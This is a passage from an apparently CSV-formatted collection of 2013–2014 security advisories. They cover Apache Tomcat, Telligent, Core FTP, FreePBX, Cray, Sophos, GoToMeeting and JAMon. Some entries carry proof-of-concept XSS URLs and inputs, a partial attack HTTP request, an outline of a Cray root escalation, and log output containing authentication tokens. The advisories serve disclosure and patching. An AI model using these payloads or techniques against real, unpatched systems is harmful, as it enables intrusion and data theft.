Tomcat) process a sequence of requests where one or more requests
contain either multiple content-length headers or a content-length
header when chunked encoding is being used and several components do not
reject the request and make different decisions as to which
content-length header to use an attacker can poison a web-cache, perform
an XSS attack and obtain sensitive information from requests other then
their own. Tomcat now rejects requests with multiple content-length
headers or with a content-length header when chunked encoding is being
used.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 8.0.0-RC3 or later
(8.0.0-RC2 contains the fix but was not released)
- - Upgrade to Apache Tomcat 7.0.47 or later
(7.0.43 to 7.0.46 contain the fix but were not released)
- - Upgrade to Apache Tomcat 6.0.39 or later
(6.0.38 contains the fix but was not released)
Credit:
This issue was identified by the Apache Tomcat security team while
investigating an invalid report related to CVE-2005-2090.
References:
[1] http://tomcat.apache.org/security-8.html
[2] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQIcBAEBAgAGBQJTDHw/AAoJEBDAHFovYFnn8HgP/107ixjTiS7es6ka2fXl01Ag
A2GUdevvgKXrbgtY6nVS1Sx65GZcG1k5Knpn6Cwg31dtipnEJmuk4+ScVlA43Jjy
8UpQbI0zm0oCgIRV6lRuYGn1kz5p7cSEF+s36QOAMym3qKNJ3YZn+pALVLgmF+D8
k7Yqe3Fwih68sJm3GRStZ9zlt5s7NNfHzSfnIe4wSyleA8xyK98Xa/8tlr3p0usK
J7V5Dz1VSmi8TRpzXUVl8cWjQrD+tCZOWrrBgkWs2oj/TXiVZfiAA5Cv7p1F7HoJ
ElF7dny5PJIFdAK3TU5WAkXRQJk2yp0FNv0YRSJGx4OLsiv+IrIXpVR4K12Hmc0n
T4RzqyhfB7VGtxrLC/PpC6hoqd+LkuT6uJJA8lcfc+F51UWSHtOV5iW0h2kC6olu
s/SKsljDOzx5L2nMdFGqs49cV4uIC8CFC8yP84EJO1gyRqyABxw3LwzUZvdMJ1Sl
29QM3vpMc3EypKXEZWe28Wbr7cZLK2oJt7pSF1DoPF/8DStYYhqztooKCyXAhjum
6Juf3C+w3HvaoR2YyIu5ZhbcGqkt0GHL+ZfvyPVcIFv+TeSYejmus0zdvQGWmnep
Fgsdlbz2dUg7ncvmj7LYwCv4U6yj2oYUgMaVrocNVB8bSg0qMnfByg0tc4h8XzDv
kNN3kqRWjmDaE37ZHywC
=YF3X
-----END PGP SIGNATURE-----"
7285,[SECURITY] CVE-2014-0033 Session fixation still possible with disableURLRewriting enabled,,CVE-2014-0033,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-0033 Session fixation still possible with disableURLRewriting
enabled
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Apache Tomcat 6.0.33 to 6.0.37
Description:
Previous fixes to path parameter handling [1] introduced a regression
that meant session IDs provided in the URL were considered even when
disableURLRewriting was configured to true. Note that the session is
only used for that single request.
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Tomcat 6.0.39 or later
(6.0.38 contains the fix but was not released)
Credit:
This issue was identified by the Apache Tomcat security team.
References:
[1] http://svn.apache.org/viewvc?view=revision&revision=r1149220
[2] http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQIcBAEBAgAGBQJTDHw3AAoJEBDAHFovYFnnNM8QAJZRox6JZVDSygO8ddp3S9Gp
FADhlqFpusDGkhO/4x+5UNaZ6nci2CVHYbVftsvxyZrsEZbmJk2rcQIcwwRtwtgj
ZTG7Vt2v5Z+PqAeFSI+7rXsaumqD+itV2M/S9o4sPjsNSHoJ4+a00S8cYs8XBG5Q
bnibxMGHbJi/ew037CTxvlZhPTM2Fir1YDwfagbNJvTbU379fg+NjZXJRa7AzWLW
46mFtRh7/PlYV9GP2rfy+l603Zgz/u9oiBAuXWkBqccUbSsgmauFJTk5jMnwF+By
PHCsbe/ptkxEqlIkUYKBv4LPlJB5rjrvTcknrwXrx6WE79pdi37rd20nwuoIuCj5
kkZkrGIKUp029BGgGe+vVnJjjWcGuCsieyDMzvU/quNE9MX5oK5SEB+20QpZvQ6v
PuAtv+h8DSvwYKlmGBoepztjXLUCfptlHu/txw4mYJhWTttaoA3mDkYoQNLpd90O
N0lZJ04OTGDpRUiUNM1//Rq+MPaN5nwM4TNQiSY7c6su8C/ol3XYBCoBIYZPgxXk
DbgD7B5ubOl/HDVzkpJifgbvX9EcrseZq62UV2Gh1ngw6QEY+XANCFE+7xX4/glt
h6F3/9AEPuppeohboG0tuR6B0BDF5lj8gEUAHl4YdAgR6uem34QULxDMMnu7ULif
7gsVJdXCzt8BS5Znvhsp
=HGNG
-----END PGP SIGNATURE-----"
7297,CVE-2014-1223 - Cross-site Scripting in Telligent Evolution,,CVE-2014-1223,"Vulnerability title: Cross-site Scripting in Telligent Evolution
CVE: CVE-2014-1223
Vendor: Telligent
Product: Evolution
Affected version: 7.5.0.32466
Fixed version: 7.6.7.36651
Reported by: Jerzy Kramarz
Details:
It is possible for an attacker to inject JavaScript by manipulating the
'msg' parameter such that the JavaScript from the manipulated request is
returned in the response. The following is an example URL which would
trigger this vulnerability:
http://host/controlpanel/loading.aspx?msg=1238c696%253cscript%253ealert%25281%2529%253c%252fscript%253e35c38a5e263
The above URL would produce the following source code returned to the user:
<div class=""CommonContentArea""> <div class=""CommonContent""> <table
cellspacing=""0"" cellpadding=""4"" border=""0""> <tr> <td><img
src=""/community/utility/spinner.gif"" width=""16"" height=""16""
border=""0""></td> <td>1238c696<script>alert(1)</script>35c38a5e263</td>
</tr> </table> </div> </div> </p>
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1223/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7327,CVE-2014-1215 - Local Code Execution in CoreFTP Core FTP Server,,CVE-2014-1215,"Vulnerability title: Local Code Execution in CoreFTP Core FTP Server
CVE: CVE-2014-1215
Vendor: CoreFTP
Product: Core FTP Server
Affected version: v1.2 build 505
Fixed version: v1.2 build 508
Reported by: Kyriakos Economou
Details:
Core FTP Server v1.2 build 505 (latest version) and possibly earlier
versions, suffer from multiple buffer overflow vulnerabilities, when
reading data from the config.dat file and/or Windows Registry using the
lstrcpy and RegQueryValueEx functions without evaluating the size of the
data based on the size of the destination buffer, which can lead to
arbitrary code execution.
It is recommended to revise all code locations where the application
makes use of those functions.
Further details at:
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1215/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information."
7331,Re: [Full-disclosure] CVE-2013-1643 - Unauthorised Access To Other Users Email Messages in Symantec PGP Universal Web Messenger,,CVE-2013-1643,"VDBs, please note that the referenced CVE ID is wrong. CVE-2014-1643 was
actually assigned to this issue by Symantec.
Tim
--
Tim Brown
<mailto:tmb 65535 com>"
7356,RE: CVE-2014-1219 - Unauthenticated Privilege Escalation in CA 2E Web Option,,CVE-2014-1219,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
> Date: Wed, 12 Feb 2014 15:59:34 -0000
> From: ""Portcullis Advisories"" <advisories portcullis-security com>
[snip]
> Vulnerability title: Unauthenticated Privilege Escalation in CA
> 2E Web Option
>
> CVE: CVE-2014-1219
> Vendor: CA
> Product: 2E Web Option
> Affected version: 8.1.2
[snip]
CA Technologies is currently investigating a vulnerability report
concerning CA 2E Web Option that was published publicly on 2014-02-11
(CVE-2014-1219).
This statement can be found at
http://blogs.ca.com/securityresponse/2014/02/13/
Note that r8.1.2 reached End of Service (EOS) on April 10, 2013 and is
no longer supported. Customers can find the End of Service Announcement,
dated April 10, 2012, on the CA Support website.
https://support.ca.com/
Thanks and regards,
Ken Williams, Director
CA Technologies Product Vulnerability Response Team
CA Technologies Business Unit Operations
Ken.Williams ca com
Copyright (C) 2014 CA. All Rights Reserved. One CA Plaza, Islandia, N.Y.
11749. All other trademarks, trade names, service marks, and logos
referenced herein belong to their respective companies.
-----BEGIN PGP SIGNATURE-----
Version: Encryption Desktop 10.3.1 (Build 13100)
Charset: utf-8
wj8DBQFS/QaPeSWR3+KUGYURApj7AKCX/WOzON/8X9BgbQk4Siz/bDtGBQCeIO8S
VrgYM0oZD2rTLdIN0aje5to=
=AjzU
-----END PGP SIGNATURE-----"
7367,[CVE-2014-1903] FreePBX 2.9 through 12 RCE,,CVE-2014-1903,"Overview:
Unauthenticated user-level Remote Code Execution (RCE) vulnerability in admin/config.php, the main interface to FreePBX. This bug was introduced in FreePBX 2.9, earlier versions are not affected.
Score - 8.4
(AV:N/AC:L/Au:N/C:P/I:P/A:C/E:H/RL:OF/RC:C/CDP:MH/TD:ND/CR:L/IR:L/AR:M)
Reference to Advisory:
http://www.freepbx.org/news/2014-02-06/security-vulnerability-notice
Reference to Bug:
http://issues.freepbx.org/browse/FREEPBX-7123
Fixed in Versions:
2.9 -- 2.9.0.14
2.10 - 2.10.1.15
2.11 - 2.11.0.23
12 - 12.0.1alpha22
Additional Information:
FreePBX contains an automatic alert service for upgrade notifications. If your system is set up correctly, you would have received an email alert of this vulnerability when it was detected and fixed. Schmoozecom strongly urges you to ensure that the email alert address is correct and up to date to ensure you receive notifications of security issues and pending updates.
Schmoozecom and FreePBX are very proactive and responsive to security issues, and care deeply about the security of our software and systems. We welcome security related bug reports and issues, and they can be submitted via email to security freepbx org for instant attention."
7371,[mwrlabs advisory][CVE-2014-0748] Cray Aprun/Apinit Privilege Escalation,,CVE-2014-0748,"Cray Aprun/Apinit Privilege Escalation
======================================
MWR have identified a vulnerability which allows users to escalate their privileges to root on Cray supercomputers. This advisory details the vulnerability and the patches which Cray customers can apply in order to mitigate this issue.
[Software]: Aprun/apinit (Cray)
[Affected Versions]: This issue was resolved in CLE 5.1.UP00 & CLE 4.2.UP02
[CVE Reference]: CVE-2014-0748
[Authors]: John Fitzpatrick & Luke Jennings
[Severity]: High Risk
[Vendor]: Cray inc.
[Vendor Response]: Acknowledged, resolved, update provided
Description
===========
Apinit and aprun are utilities used to schedule tasks on Cray supercomputers. Apinit runs as a service on compute nodes, and aprun is used to communicate with these nodes.
The apinit service does not safely validate messages supplied to it through the use of aprun. Users of Cray systems are able to exploit this weakness in order to execute commands on the compute nodes of a Cray supercomputer as arbitrary users, including root (UID 0).
Impact
======
Successful exploitation allows code execution as root on a compute node.
Cause
=====
The vulnerability is caused due to a failure to appropriately validate the content of launch messages sent from the aprun utility.
Interim Workaround
==================
N/A, Cray have provided appropriate patches for this issue.
Solution
========
Cray have addressed this issue in CLE 5.1.UP00 and CLE 4.2.UP02. Applying these updates will mitigate this issue. The Cray ID for this issue is FN5912.
Technical Details
=================
On Cray supercomputers, the aprun command provides an interface for users to submit jobs for execution on compute nodes. An example of this is as follows:
gibson$ aprun <command>
When aprun is executed, it receives a placement list of nodes from the Application Level Placement Scheduler (ALPS) detailing the compute nodes available for execution of the job. On receiving this listing, aprun then sends a launch message to the apinit daemon running on the first compute node in this list. The launch message contains various pieces of information, including the user ID (UID) under which the job will be executed. However, it was found that apinit was not validating the UID received from within this message against the trusted UID received over the privileged alpsauth connection. As a result, when apinit forks its child process (referred to as the apshepherd or just shepherd process) to launch and manage the application, the application is run under the UID specified in this launch message.
The UID within the launch message is determined by a call to getuid(), and therefore is controllable by the calling user. For example, an attacker could patch the return value from this call at runtime as aprun executes. This attack can be performed by any user of the system to escalate privileges to any other system user.
Detailed Timeline
=================
Date Summary
19/07/2013 Issue reported to Cray
19/07/2013 Acknowledgement by Cray and further details provided
20/07/2013 Issue corrected and testing underway
25/07/2013 Testing completed, patch distributed to Cray customers
https://labs.mwrinfosecurity.com/advisories/2014/01/31/cray-aprunapinit-privilege-escalation/"
7394,[SECURITY] CVE-2014-0050 Apache Commons FileUpload and Apache Tomcat DoS,,CVE-2014-0050,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-0050 Apache Commons FileUpload and Apache Tomcat DoS
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Commons FileUpload 1.0 to 1.3
- - Apache Tomcat 8.0.0-RC1 to 8.0.1
- - Apache Tomcat 7.0.0 to 7.0.50
- - Apache Tomcat 6 and earlier are not affected
Apache Tomcat 7 and Apache Tomcat 8 use a packaged renamed copy of
Apache Commons FileUpload to implement the requirement of the Servlet
3.0 and later specifications to support the processing of
mime-multipart requests. Tomcat 7 and 8 are therefore affected by this
issue. While Tomcat 6 uses Commons FileUpload as part of the Manager
application, access to that functionality is limited to authenticated
administrators.
Description:
It is possible to craft a malformed Content-Type header for a
multipart request that causes Apache Commons FileUpload to enter an
infinite loop. A malicious user could, therefore, craft a malformed
request that triggered a denial of service.
This issue was reported responsibly to the Apache Software Foundation
via JPCERT but an error in addressing an e-mail led to the unintended
early disclosure of this issue[1].
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to Apache Commons FileUpload 1.3.1 or later once released
- - Upgrade to Apache Tomcat 8.0.2 or later once released
- - Upgrade to Apache Tomcat 7.0.51 or later once released
- - Apply the appropriate patch
- Commons FileUpload: http://svn.apache.org/r1565143
- Tomcat 8: http://svn.apache.org/r1565163
- Tomcat 7: http://svn.apache.org/r1565169
- - Limit the size of the Content-Type header to less than 4091 bytes
Credit:
This issue was reported to the Apache Software Foundation via JPCERT.
References:
[1] http://markmail.org/message/kpfl7ax4el2owb3o
[2] http://tomcat.apache.org/security-8.html
[3] http://tomcat.apache.org/security-7.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
iQIcBAEBAgAGBQJS83P8AAoJEBDAHFovYFnnbOwP/0m80St7x63n6VCiR0aGuGLz
/J004spHfbc+vtg2RumObBTX6mSfvPgO2R4FzE17Etg8QtWreoxb7kjnVXUwjdMX
nb3Yt6IY1yBW1K+YcZRziOQXkRnnjnpC7Lh2o5eqpJ1S7wpXl5PBIXYSxMAsJCuv
axFA0aq5cc17uDAH1z6DPk4149oZz2lHdlBUTTkCh/0PrvcIFxwpej75gUfyaV0y
DGZLs3IpRYcJMS131q72DUt9wBsIqJN0mqUOq2svBS3mlXBcKDjy21b8QiEr8itK
UqwsYUtOZP4nZ4u8j6euxF2fC/ivm/930OGOl9pn2SbkoHJKm/4rz2GYDA9jq07K
XEDeGdTx3ZuDaTaBER8xquETRZ/Rb8dbBxQwzmo6doJNOjsMQFlR+1F+p56AhYd0
klbT6Q7i/Ic3BdRJkUpaYshhtXeAOnH+0u9j4kRXMgJbkMgOacopomFX6HoXr9/i
RHGbwwSZViLooR88Yg0FU2230+9mJLXxaJ6usHrtq4dS9ElSV320OCyisNjMX5hi
5SFYMSy+z0nsK2O6yCzlukztoFhvaNecvy3I8w5EKytweyFlPzxXn6QpQjG+ffb5
ql7TZRrApiaewp4crzBcZSAjDzRNiQpcI2xTTN/H9u/yk8lrhOULi4pljKCudvmM
eIWblFdpoPVl0iqvsXA9
=uzLf
-----END PGP SIGNATURE-----"
7395,CVE-2014-1214 - Remote Code Execution in Projoom NovaSFH Plugin,,CVE-2014-1214,"Vulnerability title: Remote Code Execution in Projoom NovaSFH Plugin
CVE: CVE-2014-1214
Vendor: Projoom
Product: NovaSFH Plugin
Version: 3.0.3
Reported by: Yuri Kramarz
Details:
The PHP executable which is responsible for handling file upload
functionality allows arbitrary files to be uploaded to any directory
specified by the attackers as the file upload function does not does not
verify file type or origin when processing the request.
Further details at:
http://www.portcullis-security.com/security-research-and-downloads/secur
ity-advisories/cve-2014-1214/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information.
###############################################################
This email originates from the systems of Portcullis
Computer Security Limited, a Private limited company,
registered in England in accordance with the Companies
Act under number 02763799. The registered office
address of Portcullis Computer Security Limited is:
The Grange Barn, Pikes End, Pinner, MIDDX,
United Kingdom, HA5 2EX.
The information in this email is confidential and may be
legally privileged. It is intended solely for the addressee.
Any opinions expressed are those of the individual and
do not represent the opinion of the organisation. Access
to this email by persons other than the intended recipient
is strictly prohibited.
If you are not the intended recipient, any disclosure,
copying, distribution or other action taken or omitted to be
taken in reliance on it, is prohibited and may be unlawful.
When addressed to our clients any opinions or advice
contained in this email is subject to the terms and
conditions expressed in the applicable Portcullis Computer
Security Limited terms of business.
###############################################################
#####################################################################################
This e-mail message has been scanned for Viruses and Content and cleared
by MailMarshal.
#####################################################################################"
7407,CVE-2014-1213 - Denial of Service in Sophos Anti Virus,,CVE-2014-1213,"Vulnerability title: Denial of Service in Sophos Anti Virus
CVE: CVE-2014-1213
Vendor: Sophos
Product: Anti Virus
Version: 10.0.11/Engine 3.48.x
Reported by: Graham Sutherland
Details:
The following system objects do not have access control lists (ACLs)
set, thus allowing any user to access and manipulate them:
Global objects (in namespace Global, a.k.a. BaseNamedObjects):
$$!_EVENT_$!__
$$!_EVENT_$!__DataUpdateRequest
$$!_EVENT_$!__MmfMutexSAV-****
$$!_EVENT_$!__MmfMutexSAV-Info
$$!_EVENT_$!__ReadyForUpdateSAV-****
$$!_EVENT_$!__ReadyForUpdateSAV-Info
$$!_EVENT_$!__SAV-****
$$!_EVENT_$!__SAV-Info
$$!_EVENT_$!__StateChange
$$!_EVENT_$!__SuspendedSAV-****
$$!_EVENT_$!__SuspendedSAV-Info
$$!_EVENT_$!__UpdateComplete
$$!_EVENT_$!__UpdateMutex
$$!_EVENT_$!__UpdateRequest
$$!_MMMF_$!__
SAV-****
SAV-Info
Session objects (in namespace Sessions BaseNamedObjects):
SophosALMonSessionInstance
Further details at:
http://www.portcullis-security.com/security-research-and-downloads/secur
ity-advisories/cve-2014-1213/
Copyright:
Copyright (c) Portcullis Computer Security Limited 2014, All rights
reserved worldwide. Permission is hereby granted for the electronic
redistribution of this information. It is not to be edited or altered in
any way without the express written consent of Portcullis Computer
Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this
information constitutes acceptance for use in an AS IS condition. There
are NO warranties, implied or otherwise, with regard to this information
or its use. Any use of this information is at the user's risk. In no
event shall the author/distributor (Portcullis Computer Security
Limited) be held liable for any damages whatsoever arising out of or in
connection with the use or spread of this information.
###############################################################
This email originates from the systems of Portcullis
Computer Security Limited, a Private limited company,
registered in England in accordance with the Companies
Act under number 02763799. The registered office
address of Portcullis Computer Security Limited is:
The Grange Barn, Pikes End, Pinner, MIDDX,
United Kingdom, HA5 2EX.
The information in this email is confidential and may be
legally privileged. It is intended solely for the addressee.
Any opinions expressed are those of the individual and
do not represent the opinion of the organisation. Access
to this email by persons other than the intended recipient
is strictly prohibited.
If you are not the intended recipient, any disclosure,
copying, distribution or other action taken or omitted to be
taken in reliance on it, is prohibited and may be unlawful.
When addressed to our clients any opinions or advice
contained in this email is subject to the terms and
conditions expressed in the applicable Portcullis Computer
Security Limited terms of business.
###############################################################
#####################################################################################
This e-mail message has been scanned for Viruses and Content and cleared
by MailMarshal.
#####################################################################################"
7426,[CVE-2014-1664] GoToMeeting Information Disclosure via Logging Output (Android),,CVE-2014-1664,"1. ADVISORY INFORMATION
========================
Title: GoToMeeting Information Disclosure via Logging Output (Android)
CVE: CVE-2014-1664
CVE Information: ASSIGNED
Date published: PUBLIC
Date of last update: 01/23/2014
Vendor Contacted: Citrix
Release mode: Coordinated Release
2. VULNERABILITY INFORMATION
=============================
Class: Information Disclosure
Impact: CVSS Details specified below
Remotely Exploitable: No
Locally Exploitable: Yes
CVE Name: [CVE-2014-1664] GoToMeeting Information Disclosure via Logging Output (Android)
3. VULNERABILITY DESCRIPTION
============================
The latest release of the software is vulnerable to information disclosure via logging output, resulting in the leak of userID, meeting details, and authentication tokens. Android applications with permissions to read system log files may obtain the leaked information.
4. VULNERABLE PACKAGES
======================
- com.citrixonline.android.gotomeeting-1.apk version 5.0.799.1238 (Android)
5. NON-VULNERABLE PACKAGES
==========================
- other platforms untested
6. CREDITS
===========
This vulnerability was discovered and researched by Claudio J. Lacayo.
7. TECHNICAL DESCRIPTION / PROOF OF CONCEPT CODE
=================================================
<! ----- SNIPPET ------- !>
D/G2M (32190): HttpRequest to: https://www2.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED]
E/qcom_sensors_hal( 787): hal_process_report_ind: Bad item quality: 11
D/dalvikvm(32190): GC_CONCURRENT freed 1322K, 43% free 20491K/35456K, paused 6ms+1ms, total 33ms
D/G2M (32190): HttpRequest response from: GET https://www2.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED] -> 200
D/G2M (32190): HttpRequest response body: GET https://www2.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED] -> {""Status"":""Redirect"",""RedirectHost"":""www1.gotomeeting.com"",""MeetingId"":""[MEETING_ID_REDACTED]""}
D/G2M (32190): Got 302 from legacy JSON API: www1.gotomeeting.com
D/G2M (32190): HttpRequest to: https://www1.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?android=true&MeetingID=[MEETING_ID_REDACTED]
D/G2M (32190): HttpRequest response from: GET https://www1.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?android=true&MeetingID=[MEETING_ID_REDACTED] -> 200
D/G2M (32190): HttpRequest response body: GET https://www1.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?android=true&MeetingID=[MEETING_ID_REDACTED] -> {""Status"":""MeetingNotStarted"",""MeetingId"":""[MEETING_ID_REDACTED]"",""IsRecurring"":false,""Endpoints"":[""Native""],""OrganizerName"":""[REDACTED]"",""Subject"":""[REDACTED]"",""MaxAttendees"":100,""IsWebinar"":false,""AudioParameters"":{""CommParams"":{""disableUdp"":false},""ConferenceParams"":{""supportedModes"":""VoIP,PSTN,Private"",""initialMode"":""Hybrid"",""SpeakerInfo"":{""PhoneInfo"":[{""description"":""Default"",""number"":""[REDACTED],""authToken"":""AAFe4rYexu4Dm7qrL45/Egx+AAAAAFLdeSkAAAAAUt7KqUbWYmXH3OcczkhGaWRf0wM2OKWa"",""accessCode"":""REDACTED""},""userId"":""userId"",""authToken"":""EAEBAQEBAQEBAQEBAQEBAQE="",""privateMessage"":"""",""audioKey"":-1,""BridgeMutingControl"":true,""VCBParams"":{""Codec"":[{""payloadType"":103,""frameLength"":30,""name"":""ISAC"",""bitrate"":32000,""channels"":1,""samplingRate"":16000},{""payloadType"":0,""frameLength"":20,""name"":""PCMU"",""bitrate"":64000,""channels"":1,""samplingRate"":8000}],""VCB"":{""port"":5060,""ipAddr"":""10.23.70.151""},""Options"":{""asUpdates"":true,""rtUpdates"":true,""dtx"":false}}}},""EndTime"":1390239900000,""StartTime"":1390237200000,""IsImpromptu"":false}
D/G2M (32190): Got response from legacy JSON API: 200
D/G2M (32190): JoinService: Attempting to join Meeting
D/G2M (32190): MeetingService: Starting Meeting join on legacy...
D/G2M (32190): HttpRequest to: https://www.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?android=true&MeetingID=[MEETING_ID_REDACTED]&PhoneInfo=,MachineID=WFNUUVtWBVRUVwRQAwUCAA==,G2MAppVersion=5.0.799.1238,BuildType=releaseBuild,Brand=google,Manufacturer=LGE,Model=Nexus5,AndroidVersionRelease=4.4.2,AndroidVersionIncremental=937116,ID=KOT49H,Product=hammerhead,Device=hammerhead,CpuABI=armeabi-v7a
D/G2M (32190): ServiceResolver: COLService: BaseURL [https://www1.gotomeeting.com], isLegacy [true}, isWebinar [false]
D/G2M (32190): HttpRequest response from: GET https://www1.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED]&PhoneInfo=,MachineID=WFNUUVtWBVRUVwRQAwUCAA==,G2MAppVersion=5.0.799.1238,BuildType=releaseBuild,Brand=google,Manufacturer=LGE,Model=Nexus5,AndroidVersionRelease=4.4.2,AndroidVersionIncremental=937116,ID=KOT49H,Product=hammerhead,Device=hammerhead,CpuABI=armeabi-v7a -> 302
D/G2M (32190): HttpRequest response body: GET https://www1.gotomeeting.com/meeting/getInfo/[MEETING_ID_REDACTED]?Portal=www.gotomeeting.com&android=true&MeetingID=[MEETING_ID_REDACTED]&PhoneInfo=,MachineID=WFNUUVtWBVRUVwRQAwUCAA==,G2MAppVersion=5.0.799.1238,BuildType=releaseBuild,Brand=google,Manufacturer=LGE,Model=Nexus5,AndroidVersionRelease=4.4.2,AndroidVersionIncremental=937116,ID=KOT49H,Product=hammerhead,Device=hammerhead,CpuABI=armeabi-v7a -> <!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
<! ----- SNIPPET ------- !>
8. CVSS 2.0 BASE METRICS
========================
Reference Base Vector Base Score
CVSS Base Score
5.4
Impact Subscore
7.8
Exploitability Subscore
3.4
CVSS Temporal Score
5.1
CVSS Environmental Score
6.6
Modified Impact Subscore
10
Overall CVSS Score
6.6

9. REPORT TIMELINE
==================
[1] 01/20/2014 - Vulnerability discovered, internal contact notified
[2] 01/21/2014 - Citrix security team notified via email
[3] 01/22/2014 - Citrix asked for testing environment details; provided.
[4] 01/23/2014 - CVE provided by CNA; public disclosure.
10. REFERENCES
=============
https://www.securecoding.cert.org/confluence/display/java/DRD04-J.+Do+not+log+sensitive+information
https://play.google.com/store/apps/details?id=com.nolanlawson.logcat&hl=en
https://drive.google.com/file/d/0B3eEtV83VTFUWEgxSTRac3JvZlk/edit?usp=sharing
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2"
7428,[CVE-2013-6235] - Multiple Reflected XSS vulnerabilities in JAMon v2.7,,CVE-2013-6235,"###################################################
01. ### Advisory Information ###
Title: Multiple Reflected XSS vulnerabilities in JAMon
Date published: 2013-01-23
Date of last update: 2013-01-23
Vendors contacted: JAMon v 2.7
Discovered by: Christian Catalano
Severity: Low
02. ### Vulnerability Information ###
CVE reference: CVE-2013-6235
CVSS v2 Base Score: 4.3
CVSS v2 Vector: (AV:N/AC:M/Au:N/C:N/I:P/A:N)
Component/s: JAMon v 2.7
Class: Input Manipulation
03. ### Introduction ###
The Java Application Monitor (JAMon) is a free, simple, high performance, thread safe, Java API that allows developers to easily monitor production applications.
http://jamonapi.sourceforge.net
04. ### Vulnerability Description ###
Multiple Non-Persistent Cross-Site Scripting vulnerabilities have been identified in the JAMon web application.
JAMon contains a flaw that allows multiple reflected cross-site scripting (XSS) attacks.
This flaw exists because certain pages do not validate input before returning it to users.
+------------------------------+-------------------+
|-Vulnerable module(s)--------and----parameter(s)--|
+------------------------------+-------------------+
|mondetail.jsp --------------------ArraySQL--------|
|mondetail.jsp --------------------listenertype----|
|mondetail.jsp --------------------currentlistener-|
|jamonadmin.jsp -------------------ArraySQL--------|
|sql.jsp---------------------------ArraySQL--------|
|exceptions.jsp--------------------ArraySQL--------|
+------------------------------+-------------------+
05. ### Technical Description / Proof of Concept Code ###
05.01) Malicious Request (""ArraySQL"" parameter):
The vulnerability is located in the ' Filter (optional) ' input field upon submission to the pages
http://localhost/jamon/mondetail.jsp
http://localhost/jamon/ jamonadmin.jsp
http://localhost/jamon/ sql.jsp
http://localhost/jamon/ exceptions.jsp
The application does not validate the 'ArraySQL' parameter upon submission to the *.jsp scripts.
The attacker can inject the malicious javascript code:
1-->1<ScRiPt >alert('XSS')</ScRiPt><!--
in the ' Filter (optional) ' input field and click on GO! button.
05.02) Malicious Request (""listenertype "" parameter)
POST /jamon/mondetail.jsp HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/jamon/mondetail.jsp
Cookie: JSESSIONID=3EFF8AFB46683B03B2CD73663A97FFDD.jboss1; ROUTEID=.jboss1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 209
